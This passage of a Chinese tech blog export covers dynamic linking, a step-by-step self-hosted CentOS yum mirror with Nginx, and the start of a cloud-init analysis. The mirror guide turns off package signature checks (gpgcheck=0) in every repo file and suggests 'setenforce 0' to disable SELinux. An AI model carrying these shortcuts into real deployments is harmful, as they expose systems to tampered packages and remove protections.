动态链接</h2><p>静态库是在链接阶段将汇编生成的目标文件<code>.o</code>与引用到的库一起链接打包到可执行文件中。因此对应的链接方式称为静态链接。试想一下，静态库与汇编生成的目标文件一起链接为可执行文件，那么静态库必定跟<code>.o</code>文件格式相似。其实一个静态库可以简单看成是一组目标文件（<code>.o</code>&#x2F;.obj文件）的集合，即很多目标文件经过压缩打包后形成的一个文件。</p>\n<p>在Linux环境下，静态库文件后缀是<code>.a</code>，Windows是<code>.lib</code>，其主要特点是：</p>\n<ul>\n<li>静态库对函数库的链接是放在<strong>编译期</strong>(Compile)完成的</li>\n<li>程序在运行时与函数库再无瓜葛，移植方便</li>\n<li>浪费空间和资源，因为所有相关的目标文件与牵涉到的函数库被链接合成一个可执行文件</li>\n</ul>\n<p>动态库在程序编译时并不会被连接到目标代码中，而是在程序运行是才被载入。不同的应用程序如果调用相同的库，那么在内存里只需要有一份该共享库的实例，规避了空间浪费问题。动态库在程序运行是才被载入，也解决了静态库对程序的更新、部署和发布页会带来麻烦。用户只需要更新动态库即可，增量更新。</p>\n<img src=\"/2021/10/31/%E7%BC%96%E8%AF%91%E5%9E%8B%E8%AF%AD%E8%A8%80%E5%92%8C%E8%A7%A3%E9%87%8A%E5%9E%8B%E8%AF%AD%E8%A8%80%E7%9A%84%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/dynamic.jpg\" class=\"\">\n\n<p>在Linux环境下，动态库文件后缀是<code>.so</code>，Windows是<code>.dll</code>，其主要特点是：</p>\n<ul>\n<li>动态库把对一些库函数的链接载入推迟到程序<strong>运行时</strong>（Runtime）的时期</li>\n<li>可以实现进程之间的资源共享，因此动态库也称为共享库</li>\n<li>将一些程序升级变得简单</li>\n<li>甚至可以真正做到链接载入完全由程序员在程序代码中控制（显式调用）</li>\n</ul>\n<h2 id=\"附录三：脚本语言-Scripting-language\"><a href=\"#附录三：脚本语言-Scripting-language\" class=\"headerlink\" title=\"附录三：脚本语言 - Scripting language\"></a>附录三：脚本语言 - Scripting language</h2><p>脚本语言（Scripting language）是让程序员快速完成程序的编写工作而创建的计算机编程语言，具有简单、易学、易用的特性。早期的脚本语言经常被称为批处理语言或作业控制语言。</p>\n<blockquote>\n<p>脚本语言与解释型语言并不是一个范畴的概念，但脚本代码通常是解释运行而非编译，开发脚本的目的就是快速连接多个软件组件。</p>\n</blockquote>\n<p>一些众所周知的例子：</p>\n<ul>\n<li>Lisp，最早的脚本语言，是一系列用于特定应用程序的通用语言和扩展语言，例如Emacs Lisp，用于Emacs编辑器</li>\n<li>Bash，一种用于Unix和类 Unix 操作系统和环境的解释性脚本语言。</li>\n<li>PowerShell，一种用于Microsoft Windows操作系统的脚本语言。</li>\n<li>sed和AWK，两种主要用于类 Unix 环境的文本处理语言。</li>\n<li>Perl，一种文本处理语言，后来发展成为一种通用语言，也用作各种应用程序的扩展语言。</li>\n<li>Python是一种通用脚本语言，也用作扩展语言。</li>\n<li>JavaScript（后来的：ECMAScript），最初是一种非常小的、高度特定于领域的语言，仅限于在 Web 浏览器中运行以动态修改正在显示的网页，后来发展成为一种广泛可移植的通用编程语言。</li>\n<li>Visual Basic for Applications，一种专用于Microsoft Office应用程序的扩展语言。</li>\n<li>Lua，一种设计用于一般应用程序的扩展语言的语言，并被许多不同的应用程序使用。</li>\n</ul>\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ul>\n<li><a href=\"http://gcc.gnu.org/\">GCC的官方网站</a></li>\n<li><a href=\"https://llvm-tutorial-cn.readthedocs.io/en/latest/index.html\">用LLVM开发新语言</a></li>\n<li><a href=\"https://www.ruanyifeng.com/blog/2018/01/assembly-language-primer.html\">汇编语言入门教程 - 阮一峰</a></li>\n<li><a href=\"https://blog.csdn.net/qq_36287943/article/details/103601371\">GCC简单编译流程</a></li>\n<li><a href=\"https://hltj.me/lang/2017/08/01/modern-lang-static-type.html\">现代编程语言系列1：静态类型趋势</a></li>\n<li><a href=\"https://www.zhihu.com/question/19918532\">讨论帖 - 弱类型、强类型、动态类型、静态类型语言的区别是什么？</a></li>\n</ul>\n"},{"title":"自建yum软件源的安装记录","url":"/2020/09/02/%E8%87%AA%E5%BB%BAyum%E8%BD%AF%E4%BB%B6%E6%BA%90%E7%9A%84%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/","content":"<h2 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h2><p>基于Centos 7.8的基线版本，同步yum软件源，为客户端提供内网下载服务<br>Server采用Nginx提供下载服务，默认采用http方式</p>\n<h2 id=\"Sever的安装步骤\"><a href=\"#Sever的安装步骤\" class=\"headerlink\" title=\"Sever的安装步骤\"></a>Sever的安装步骤</h2><h3 id=\"1-准备工作\"><a href=\"#1-准备工作\" class=\"headerlink\" title=\"1. 准备工作\"></a>1. 准备工作</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 安装必须的基础软件</span></span><br><span class=\"line\">yum install -y yum-utils reposyn createrepo</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 删除所有系统自带的REPO源</span></span><br><span class=\"line\"><span class=\"built_in\">rm</span> -f /etc/yum.repos.d/*.repo</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-创建自定义的REPO源\"><a href=\"#2-创建自定义的REPO源\" class=\"headerlink\" title=\"2. 创建自定义的REPO源\"></a>2. 创建自定义的REPO源</h3><figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 设置REPO软件源，注意 $ 前面的转义符！</span></span><br><span class=\"line\"><span class=\"built_in\">cat</span> &gt; /etc/yum.repos.d/Source-CentOS.repo &lt;&lt;- <span class=\"string\">EOF</span></span><br><span class=\"line\"><span class=\"string\"># CentOS-Base.repo</span></span><br><span class=\"line\"><span class=\"string\">#</span></span><br><span class=\"line\"><span class=\"string\"># Yum Repo Source for Centos 7.8 baseline</span></span><br><span class=\"line\"><span class=\"string\"># Create by sj0225@icloud.com</span></span><br><span class=\"line\"><span class=\"string\">#</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">[base]</span></span><br><span class=\"line\"><span class=\"string\">name=CentOS-\\$releasever - Base</span></span><br><span class=\"line\"><span class=\"string\">baseurl=https://mirrors.huaweicloud.com/centos/\\$releasever/os/\\$basearch/</span></span><br><span class=\"line\"><span class=\"string\">enabled=1</span></span><br><span class=\"line\"><span class=\"string\">gpgcheck=0</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">#released updates</span></span><br><span class=\"line\"><span class=\"string\">[updates]</span></span><br><span class=\"line\"><span class=\"string\">name=CentOS-\\$releasever - Updates</span></span><br><span class=\"line\"><span class=\"string\">baseurl=https://mirrors.huaweicloud.com/centos/\\$releasever/updates/\\$basearch/</span></span><br><span class=\"line\"><span class=\"string\">enabled=1</span></span><br><span class=\"line\"><span class=\"string\">gpgcheck=0</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">#additional packages that may be useful</span></span><br><span class=\"line\"><span class=\"string\">[extras]</span></span><br><span class=\"line\"><span class=\"string\">name=CentOS-\\$releasever - Extras</span></span><br><span class=\"line\"><span class=\"string\">baseurl=https://mirrors.huaweicloud.com/centos/\\$releasever/extras/\\$basearch/</span></span><br><span class=\"line\"><span class=\"string\">enabled=1</span></span><br><span class=\"line\"><span class=\"string\">gpgcheck=0</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">#additional packages that extend functionality of existing packages</span></span><br><span class=\"line\"><span class=\"string\">[centosplus]</span></span><br><span class=\"line\"><span class=\"string\">name=CentOS-\\$releasever - Plus</span></span><br><span class=\"line\"><span class=\"string\">baseurl=https://mirrors.huaweicloud.com/centos/\\$releasever/centosplus/\\$basearch/</span></span><br><span class=\"line\"><span class=\"string\">enabled=1</span></span><br><span class=\"line\"><span class=\"string\">gpgcheck=0</span></span><br><span class=\"line\"><span class=\"string\">EOF</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">cat</span> &gt; /etc/yum.repos.d/Source-Docker-CE.repo &lt;&lt;- <span class=\"string\">EOF</span></span><br><span class=\"line\"><span class=\"string\">[docker-ce]</span></span><br><span class=\"line\"><span class=\"string\">name=Docker CE Stable - \\$basearch</span></span><br><span class=\"line\"><span class=\"string\">baseurl=https://mirrors.huaweicloud.com/docker-ce/linux/centos/\\$releasever/\\$basearch/stable/</span></span><br><span class=\"line\"><span class=\"string\">enabled=1</span></span><br><span class=\"line\"><span class=\"string\">gpgcheck=0</span></span><br><span class=\"line\"><span class=\"string\">EOF</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">cat</span> &gt; /etc/yum.repos.d/Source-EPEL.repo &lt;&lt;- <span class=\"string\">EOF</span></span><br><span class=\"line\"><span class=\"string\">[epel]</span></span><br><span class=\"line\"><span class=\"string\">name=Extra Packages for Enterprise Linux 7 - \\$basearch</span></span><br><span class=\"line\"><span class=\"string\">baseurl=https://mirrors.huaweicloud.com/epel/\\$releasever/\\$basearch</span></span><br><span class=\"line\"><span class=\"string\">enabled=1</span></span><br><span class=\"line\"><span class=\"string\">gpgcheck=0</span></span><br><span class=\"line\"><span class=\"string\">EOF</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">cat</span> &gt; /etc/yum.repos.d/Source-Kubernetes.repo &lt;&lt;- <span class=\"string\">EOF</span></span><br><span class=\"line\"><span class=\"string\">[kubernetes]</span></span><br><span class=\"line\"><span class=\"string\">name=kubernetes - el7-x86_64</span></span><br><span class=\"line\"><span class=\"string\">baseurl=https://mirrors.cloud.tencent.com/kubernetes/yum/repos/kubernetes-el7-x86_64/</span></span><br><span class=\"line\"><span class=\"string\">enabled=1</span></span><br><span class=\"line\"><span class=\"string\">gpgcheck=0</span></span><br><span class=\"line\"><span class=\"string\">EOF</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>目前定义了四个REPO文件，分别是：</p>\n<ul>\n<li><code>Source-CentOS.repo</code>： Cenots的官方软件，包含base、updates、extras、centosplus四个子项，来自华为云</li>\n<li><code>Source-EPEL.repo</code>: Redhat维护的常用软件源，来自华为云</li>\n<li><code>Source-Docker-CE.repo</code>: Docker开源社区版，来自华为云</li>\n<li><code>Source-Kubernetes.repo</code>: Google提供的Kubernetes安装包，来自腾讯云（华为云的目录结构无法顺利同步！）</li>\n</ul>\n<blockquote>\n<p>Kubernetes依赖于Linux内核版本，目前用的是<code>e17-x86-64</code></p>\n</blockquote>\n<h3 id=\"3-从外网获取REPO源包含的rpm软件包\"><a href=\"#3-从外网获取REPO源包含的rpm软件包\" class=\"headerlink\" title=\"3. 从外网获取REPO源包含的rpm软件包\"></a>3. 从外网获取REPO源包含的rpm软件包</h3><p>通过reposyn获取REPO源的rpm安装包，并存放在<code>/data/</code>目录下，目前数据量约为37G</p>\n<blockquote>\n<p>简便起见，目前没有启用GPG校验功能！</p>\n</blockquote>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 清理yum缓存</span></span><br><span class=\"line\">yum clean all</span><br><span class=\"line\">yum makecache</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 从外网下载rpm安装包</span></span><br><span class=\"line\">reposync -r base -p /data/centos</span><br><span class=\"line\">reposync -r extras -p /data/centos</span><br><span class=\"line\">reposync -r updates -p /data/centos</span><br><span class=\"line\">reposync -r centosplus -p /data/centos</span><br><span class=\"line\"></span><br><span class=\"line\">reposync -r epel -p /data</span><br><span class=\"line\">reposync -r docker-ce -p /data</span><br><span class=\"line\">reposync -r kubernetes -p /data</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"4-创建或更新REPO索引\"><a href=\"#4-创建或更新REPO索引\" class=\"headerlink\" title=\"4. 创建或更新REPO索引\"></a>4. 创建或更新REPO索引</h3><p>创建并执行一个更新索引文件的脚本，位于<code>/root/repo-sync.sh</code>（以后还将用于crontab定时任务更新）。</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">###参数-n指下载最新软件包，-p指定目录，指定本地的源--repoid（如果不指定就同步本地服务器所有的源）,下载过程比较久</span></span><br><span class=\"line\">/usr/bin/reposync -n --repoid=extras --repoid=updates --repoid=base --repoid=centosplus -p /data/centos</span><br><span class=\"line\">/usr/bin/reposync -n --repoid=epel -p /data</span><br><span class=\"line\">/usr/bin/reposync -n --repoid=docker-ce -p /data</span><br><span class=\"line\">/usr/bin/reposync -n --repoid=kubernetes -p /data</span><br><span class=\"line\"></span><br><span class=\"line\">/usr/bin/createrepo --update /data/centos/base --worker 4</span><br><span class=\"line\">/usr/bin/createrepo --update /data/centos/extras --worker 4</span><br><span class=\"line\">/usr/bin/createrepo --update /data/centos/updates --worker 4</span><br><span class=\"line\">/usr/bin/createrepo --update /data/centos/centosplus --worker 4</span><br><span class=\"line\">/usr/bin/createrepo --update /data/epel --worker 4</span><br><span class=\"line\">/usr/bin/createrepo --update /data/docker-ce --worker 4</span><br><span class=\"line\">/usr/bin/createrepo --update /data/kubernetes --worker 4</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"5-设置HTTP文件下载服务\"><a href=\"#5-设置HTTP文件下载服务\" class=\"headerlink\" title=\"5. 设置HTTP文件下载服务\"></a>5. 设置HTTP文件下载服务</h3><p>推荐采用Nginx提供http文件下载服务</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">yum install nginx -y</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">cat</span> &gt; /etc/nginx/nginx.conf &lt;&lt;- <span class=\"string\">EOF</span></span><br><span class=\"line\"><span class=\"string\">user nginx;</span></span><br><span class=\"line\"><span class=\"string\">worker_processes auto;</span></span><br><span class=\"line\"><span class=\"string\">error_log /var/log/nginx/error.log;</span></span><br><span class=\"line\"><span class=\"string\">pid /run/nginx.pid;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">include /usr/share/nginx/modules/*.conf;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">events &#123;</span></span><br><span class=\"line\"><span class=\"string\">    worker_connections 1024;</span></span><br><span class=\"line\"><span class=\"string\">&#125;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">http &#123;</span></span><br><span class=\"line\"><span class=\"string\">    log_format  main  &#x27;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &#x27;</span></span><br><span class=\"line\"><span class=\"string\">                      &#x27;$status $body_bytes_sent &quot;$http_referer&quot; &#x27;</span></span><br><span class=\"line\"><span class=\"string\">                      &#x27;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&#x27;;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    access_log  /var/log/nginx/access.log  main;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    sendfile            on;</span></span><br><span class=\"line\"><span class=\"string\">    tcp_nopush          on;</span></span><br><span class=\"line\"><span class=\"string\">    tcp_nodelay         on;</span></span><br><span class=\"line\"><span class=\"string\">    keepalive_timeout   65;</span></span><br><span class=\"line\"><span class=\"string\">    types_hash_max_size 2048;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    include             /etc/nginx/mime.types;</span></span><br><span class=\"line\"><span class=\"string\">    default_type        application/octet-stream;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    server &#123;</span></span><br><span class=\"line\"><span class=\"string\">        listen 80;</span></span><br><span class=\"line\"><span class=\"string\">        server_name localhost;</span></span><br><span class=\"line\"><span class=\"string\">        charset utf-8;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">        location / &#123;</span></span><br><span class=\"line\"><span class=\"string\">            root /data;</span></span><br><span class=\"line\"><span class=\"string\">            autoindex on;</span></span><br><span class=\"line\"><span class=\"string\">            autoindex_exact_size off;</span></span><br><span class=\"line\"><span class=\"string\">            autoindex_localtime on;</span></span><br><span class=\"line\"><span class=\"string\">        &#125;</span></span><br><span class=\"line\"><span class=\"string\">    &#125;</span></span><br><span class=\"line\"><span class=\"string\">&#125;</span></span><br><span class=\"line\"><span class=\"string\">EOF</span></span><br><span class=\"line\"></span><br><span class=\"line\">systemctl <span class=\"built_in\">enable</span> nginx</span><br><span class=\"line\">systemctl start nginx</span><br><span class=\"line\">systemctl status nginx</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"6-测试检查工作\"><a href=\"#6-测试检查工作\" class=\"headerlink\" title=\"6. 测试检查工作\"></a>6. 测试检查工作</h3><p>安装完成，现在浏览器打开Server的IP地址，就可以看到软件源的目录结构，并可以提供给Client使用了。</p>\n<figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">/data</span><br><span class=\"line\">├── centos</span><br><span class=\"line\">│   ├── base</span><br><span class=\"line\">│   │   ├── Packages</span><br><span class=\"line\">│   │   └── repodata</span><br><span class=\"line\">│   ├── centosplus</span><br><span class=\"line\">│   │   ├── Packages</span><br><span class=\"line\">│   │   └── repodata</span><br><span class=\"line\">│   ├── extras</span><br><span class=\"line\">│   │   ├── Packages</span><br><span class=\"line\">│   │   └── repodata</span><br><span class=\"line\">│   └── updates</span><br><span class=\"line\">│       ├── Packages</span><br><span class=\"line\">│       └── repodata</span><br><span class=\"line\">├── docker-ce</span><br><span class=\"line\">│   ├── Packages</span><br><span class=\"line\">│   └── repodata</span><br><span class=\"line\">├── epel</span><br><span class=\"line\">│   ├── Packages</span><br><span class=\"line\">│   │   ├── 0</span><br><span class=\"line\">│   │   ├── 2</span><br><span class=\"line\">│   │   ├── 3</span><br><span class=\"line\">......</span><br><span class=\"line\">│   │   ├── y</span><br><span class=\"line\">│   │   └── z</span><br><span class=\"line\">│   └── repodata</span><br><span class=\"line\">└── kubernetes</span><br><span class=\"line\">    ├── Packages</span><br><span class=\"line\">    └── repodata</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>Nginx服务如果网络端口或目录权限等问题导致不能正常启动，往往是SELinux在搞鬼，可以通过<code>setenforce 0</code>强制关闭</p>\n</blockquote>\n<h3 id=\"7-设置定时更新任务\"><a href=\"#7-设置定时更新任务\" class=\"headerlink\" title=\"7. 设置定时更新任务\"></a>7. 设置定时更新任务</h3><p>如果一切检查顺利，最后根据位于<code>/root/repo-sync.sh</code>，追加到crontab定时任务更新。</p>\n<h2 id=\"Client的使用方法\"><a href=\"#Client的使用方法\" class=\"headerlink\" title=\"Client的使用方法\"></a>Client的使用方法</h2><p>要在内网使用自建YUM源就很简单了。</p>\n<p>首先，确认<code>mirrror.caogo.local</code>的域名能够被准确解析。<br>然后，在目录<code>/etc/yum.repos.d/</code>设置自定义的REPO源就OK了。</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">rm</span> -f /etc/yum.repos.d/*.repo</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">cat</span> &gt; /etc/yum.repos.d/Caogo-CentOS.repo &lt;&lt;- <span class=\"string\">EOF</span></span><br><span class=\"line\"><span class=\"string\"># CentOS-Base.repo</span></span><br><span class=\"line\"><span class=\"string\">#</span></span><br><span class=\"line\"><span class=\"string\"># Yum Repo Source for Centos 7.8 baseline</span></span><br><span class=\"line\"><span class=\"string\"># Created by sj0225@icloud.com</span></span><br><span class=\"line\"><span class=\"string\">#</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">[base]</span></span><br><span class=\"line\"><span class=\"string\">name=CentOS - Base</span></span><br><span class=\"line\"><span class=\"string\">baseurl=http://mirror.caogo.local/centos/base/</span></span><br><span class=\"line\"><span class=\"string\">enabled=1</span></span><br><span class=\"line\"><span class=\"string\">gpgcheck=0</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">#released updates</span></span><br><span class=\"line\"><span class=\"string\">[updates]</span></span><br><span class=\"line\"><span class=\"string\">name=CentOS - Updates</span></span><br><span class=\"line\"><span class=\"string\">baseurl=http://mirror.caogo.local/centos/updates/</span></span><br><span class=\"line\"><span class=\"string\">enabled=1</span></span><br><span class=\"line\"><span class=\"string\">gpgcheck=0</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">#additional packages that may be useful</span></span><br><span class=\"line\"><span class=\"string\">[extras]</span></span><br><span class=\"line\"><span class=\"string\">name=CentOS - Extras</span></span><br><span class=\"line\"><span class=\"string\">baseurl=http://mirror.caogo.local/centos/extras/</span></span><br><span class=\"line\"><span class=\"string\">enabled=1</span></span><br><span class=\"line\"><span class=\"string\">gpgcheck=0</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">#additional packages that extend functionality of existing packages</span></span><br><span class=\"line\"><span class=\"string\">[centosplus]</span></span><br><span class=\"line\"><span class=\"string\">name=CentOS - Plus</span></span><br><span class=\"line\"><span class=\"string\">baseurl=http://mirror.caogo.local/centos/centosplus/</span></span><br><span class=\"line\"><span class=\"string\">enabled=1</span></span><br><span class=\"line\"><span class=\"string\">gpgcheck=0</span></span><br><span class=\"line\"><span class=\"string\">EOF</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">cat</span> &gt; /etc/yum.repos.d/Caogo-Docker-CE.repo &lt;&lt;- <span class=\"string\">EOF</span></span><br><span class=\"line\"><span class=\"string\">[docker-ce]</span></span><br><span class=\"line\"><span class=\"string\">name=Docker CE Stable</span></span><br><span class=\"line\"><span class=\"string\">baseurl=http://mirror.caogo.local/docker-ce/</span></span><br><span class=\"line\"><span class=\"string\">enabled=1</span></span><br><span class=\"line\"><span class=\"string\">gpgcheck=0</span></span><br><span class=\"line\"><span class=\"string\">EOF</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">cat</span> &gt; /etc/yum.repos.d/Caogo-EPEL.repo &lt;&lt;- <span class=\"string\">EOF</span></span><br><span class=\"line\"><span class=\"string\">[epel]</span></span><br><span class=\"line\"><span class=\"string\">name=Extra Packages for Enterprise Linux 7</span></span><br><span class=\"line\"><span class=\"string\">baseurl=http://mirror.caogo.local/epel/</span></span><br><span class=\"line\"><span class=\"string\">enabled=1</span></span><br><span class=\"line\"><span class=\"string\">gpgcheck=0</span></span><br><span class=\"line\"><span class=\"string\">EOF</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">cat</span> &gt; /etc/yum.repos.d/Caogo-Kubernetes.repo &lt;&lt;- <span class=\"string\">EOF</span></span><br><span class=\"line\"><span class=\"string\">[kubernetes]</span></span><br><span class=\"line\"><span class=\"string\">name=kubernetes - el7-x86_64</span></span><br><span class=\"line\"><span class=\"string\">baseurl=http://mirror.caogo.local/kubernetes/</span></span><br><span class=\"line\"><span class=\"string\">enabled=1</span></span><br><span class=\"line\"><span class=\"string\">gpgcheck=0</span></span><br><span class=\"line\"><span class=\"string\">EOF</span></span><br><span class=\"line\"></span><br><span class=\"line\">yum repolist</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<hr>\n<h2 id=\"参考资料\"><a href=\"#参考资料\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h2><ul>\n<li><p>阿里云的软件源网址：<a href=\"https://developer.aliyun.com/mirror/\">https://developer.aliyun.com/mirror</a></p>\n</li>\n<li><p>腾讯云的软件源网址：<a href=\"https://mirrors.cloud.tencent.com/\">https://mirrors.cloud.tencent.com</a></p>\n</li>\n<li><p>华为云的软件源网址：<a href=\"https://mirrors.huaweicloud.com/\">https://mirrors.huaweicloud.com</a></p>\n</li>\n<li><p><a href=\"https://xy2401.com/local-docs/gnu/manual.zh/wget.html\">Wget 1.20手册</a></p>\n</li>\n</ul>\n"},{"title":"虚拟机管理软件cloud-init技术分析","url":"/2023/09/10/%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%AE%A1%E7%90%86%E8%BD%AF%E4%BB%B6cloud-init%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/","content":"<h2 id=\"一、概述\"><a href=\"#一、概述\" class=\"headerlink\" title=\"一、概述\"></a>一、概述</h2><p>cloud-init 最初由 ubuntu 的母公司 Canonical 开发，基本设计思路是：</p>\n<ul>\n<li>当用户首次创建虚拟机时，将前台设置的主机名，密码或者秘钥等存入后台的元数据服务器 - metadata server</li>\n<li>当 cloud-init 随虚拟机启动而运行时，通过 http 协议访问 metadata server</li>\n<li>虚拟机根据预设的元数据信息修改主机配置，从而完成系统的环境初始化</li>\n</ul>\n<p>目前大部分公有云（openstack, AWS, Aliyun）都在使用 cloud-init , 已经成为事实的工业标准。<br>开源代码： <a href=\"https://github.com/cloud-init/cloud-init\">https://github.com/cloud-init/cloud-init</a><br>官方文档： <a href=\"https://cloudinit.readthedocs.io/en/latest/\">https://cloudinit.readthedocs.io/en/latest/</a></p>\n<p>cloud-init 基于 Python 开发，可以通过<code>yum install cloud-init</code>进行安装，此外还有2个辅助软件包，<code>cloud-utils-growpart</code>用于磁盘空间自动扩容，<code>cloud-utils</code>用于镜像格式转换等。</p>\n<ul>\n<li>程序入口：<code>/usr/bin/cloud-init</code></li>\n<li>代码安装目录：<code>/usr/lib/python2.7/site-packages/cloudinit/</code></li>\n<li>核心配置文件：<code>/etc/cloud/cloud.cfg</code></li>\n<li>日志文件位于：<code>/var/log/cloud-init.log</code></li>\n<li>模版文件目录：<code>/etc/cloud/templates/</code></li>\n<li>缓存数据位于：<code>/var/lib/cloud/</code></li>\n<li>系统服务目录：<code>/usr/lib/systemd/system/</code></li>\n</ul>\n<p>本文以 centos7.8 + cloud-init 19.4 为例，分析其工作原理和实现方式。</p>\n<blockquote>\n<p>cloud-init 版本从 0.7.9 突变为 17.1，最新版本为 23.3.1，测试版本为 19.4.0<br>早期版本基于 Python2.7 开发，后来改为 Python3，因此代码安装目录可能有变化</p>\n</blockquote>\n<h2 id=\"二、工作原理\"><a href=\"#二、工作原理\" class=\"headerlink\" title=\"二、工作原理\"></a>二、工作原理</h2><p>cloud-init 对系统的初始化分为四个阶段，分别是：local、init、config、final。<br>一般通过 systemd 进行管理，通过命令<code>systemctl list-unit-files |grep cloud</code>，可以列出四个阶段对应的 cloud-init-local、cloud-init、cloud-config、cloud-final 等4个 service 文件。</p>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">cloud-config.service                          enabled </span><br><span class=\"line\">cloud-final.service                           enabled </span><br><span class=\"line\">cloud-init-local.service                      enabled </span><br><span class=\"line\">cloud-init.service                            enabled </span><br><span class=\"line\">cloud-config.target                           static  </span><br><span class=\"line\">cloud-init.target                             static </span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>.target 是静态定义，一般只有描述服务之间依赖关系的 Unit 段，不包含执行命令</p>\n</blockquote>\n<p>systemd 服务启动时会有一个简单的 generator stage，其任务是检查系统状态检查，并读取主配置文件<code>cloud.cfg</code>。<br>如果满足以下情况，cloud-init 将不在开机时启动，本组内其他 service 也遵循该规则：</p>\n<ul>\n<li><code>/etc/cloud/cloud-init.disabled</code> 文件存在时</li>\n<li>当内核命令发现文件 <code>/proc/cmdline</code>包含 <code>cloud-init=disabled</code>时</li>\n</ul>\n<blockquote>\n<p>当在容器中运行时，内核命令可能会被忽略，但是 cloud-init 会读取<code>KERNEL_CMDLINE</code>环境变量</p>\n</blockquote>\n<h3 id=\"1-Local-Stage\"><a href=\"#1-Local-Stage\" class=\"headerlink\" title=\"1. Local Stage\"></a>1. Local Stage</h3><p>作为虚拟机实例启动 cloud-init 的第一个阶段，其任务是：查找<strong>本地</strong>数据源，并应用于网络配置！<br>分析 systemd 配置文件<code>cloud-init-local.service</code>，发现：</p>\n<ul>\n<li>依赖于 systemd-remount-fs.service，即需要加载 root 文件系统</li>\n<li>检查是否存在缓存文件目录<code>/var/lib/cloud</code></li>\n<li>核心执行代码：<code>/usr/bin/cloud-init init --local</code></li>\n</ul>\n<p>所谓本地数据源，有以下几种方式：</p>\n<ul>\n<li>datasource：本机的config drive（例如 PVE 的Cloud-init CDROM），或者 Openstack、EC2 提供的云网络配置</li>\n<li>fallback：默认方式，相当于<code>dhcp on eth0</code>，即直接通过 DHCP 服务获得网络配置信息</li>\n<li>none：禁用网络。可以通过在<code>/etc/cloud/cloud.cfg</code>中，添加内容<code>network: &#123;config: disabled&#125;</code>实现</li>\n</ul>\n<blockquote>\n<p>所支持的数据源定义位于：<code>/usr/lib/python2.7/site-packages/cloudinit/settings.py</code>中的变量<code>CFG_BUILTIN.datasource_list</code></p>\n</blockquote>\n<p>如果是该实例的第一次启动，那么被选中的网络配置会被应用，所有老旧的配置都会会清除。<br>该阶段需要阻止网络服务启动以及老的配置被应用，这可能带来一些负面的影响，比如 DHCP 服务挂起，或者已经广播了老的 hostname，这可能导致系统进入一个奇怪的状态需要重启网络设备。</p>\n<h3 id=\"2-Init-Stage\"><a href=\"#2-Init-Stage\" class=\"headerlink\" title=\"2. Init Stage\"></a>2. Init Stage</h3><p>在官方文档中，也称为 Network Stage。<br>分析 systemd 配置文件<code>cloud-init.service</code>，发现：</p>\n<ul>\n<li>依赖于 cloud-init-local.service 和 